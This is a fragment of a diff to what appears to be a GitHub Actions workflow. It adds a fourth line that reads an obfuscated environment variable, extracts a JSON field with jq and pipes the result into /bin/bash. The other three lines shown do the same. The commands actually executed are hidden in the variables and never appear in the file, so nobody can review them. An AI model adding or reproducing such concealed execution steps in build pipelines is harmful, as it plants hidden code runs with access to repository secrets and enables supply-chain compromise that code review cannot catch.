@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ih8" | jq -r .vfalr412 | /bin/bash
           echo $kuvio1 | jq -r .pyg2 | /bin/bash
           echo $ghzd17791 | jq -r .h3711 | /bin/bash
+          printf '%s' "$hpdcc99" | jq -r .gzsn806 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
